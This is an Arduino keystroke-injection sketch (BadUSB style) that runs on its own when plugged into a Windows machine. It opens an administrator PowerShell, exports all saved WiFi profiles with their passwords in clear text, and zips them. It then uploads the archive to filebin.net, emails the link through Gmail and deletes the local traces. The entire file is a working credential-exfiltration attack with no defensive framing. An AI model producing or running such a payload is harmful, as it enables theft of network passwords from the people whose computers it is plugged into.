#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);

  // === 1. Open Admin PowerShell ===
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); Keyboard.releaseAll();
  delay(600);
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  delay(500); Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(3500);
  Keyboard.press(KEY_LEFT_ARROW); Keyboard.releaseAll();
  delay(300); Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(2000);

  // === 2. Export & Zip WiFi ===
  Keyboard.println("New-Item -ItemType Directory -Path C:\\WiFiBackup -Force | Out-Null");
  delay(1000);
  Keyboard.println("netsh wlan export profile key=clear folder=C:\\WiFiBackup | Out-Null");
  delay(5000);
  Keyboard.println("Compress-Archive -Path C:\\WiFiBackup -DestinationPath C:\\WiFiBackup.zip -Force");
  delay(4000);

  // === 3. Upload to Filebin ===
  Keyboard.println("$response = curl.exe --data-binary @C:\\WiFiBackup.zip -H \"filename: WiFiBackup.zip\" https://filebin.net");
  delay(6000);
  Keyboard.println("$json = $response | ConvertFrom-Json");
  Keyboard.println("$link = \"https://filebin.net/$($json.bin.id)/$($json.file.filename)\"");

  // === 4. SEND LINK TO YOUR EMAIL (GMAIL) ===
  Keyboard.println("$P = ConvertTo-SecureString 'YOUR APP PASSWORD' -AsPlainText -Force");
  delay(500);
  Keyboard.println("$C = New-Object System.Management.Automation.PSCredential 'muneebsiddique007@gmail.com', $P");
  delay(500);
  Keyboard.println("Send-MailMessage -From 'muneebsiddique007@gmail.com' -To 'muneebsiddique007@gmail.com' -Subject 'WiFi Passwords Ready' -Body \"Download: $link\" -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $C");
  delay(8000);

  // === 5. Save Link Locally (Optional) ===
  Keyboard.println("$link | Out-File -FilePath \"$env:USERPROFILE\\Desktop\\WiFi_Link.txt\" -Encoding ASCII");
  Keyboard.println("$link | clip");

  // === 6. Show & Cleanup ===
  Keyboard.println("notepad \"$env:USERPROFILE\\Desktop\\WiFi_Link.txt\"");
  delay(1500);
  Keyboard.println("Start-Process $link");
  Keyboard.println("Remove-Item -Recurse -Force C:\\WiFiBackup -ErrorAction SilentlyContinue");
  Keyboard.println("Remove-Item -Force C:\\WiFiBackup.zip -ErrorAction SilentlyContinue");
  Keyboard.println("Write-Host 'SENT TO YOUR EMAIL! Check Gmail.'");

  Keyboard.end();
}

void loop() {}
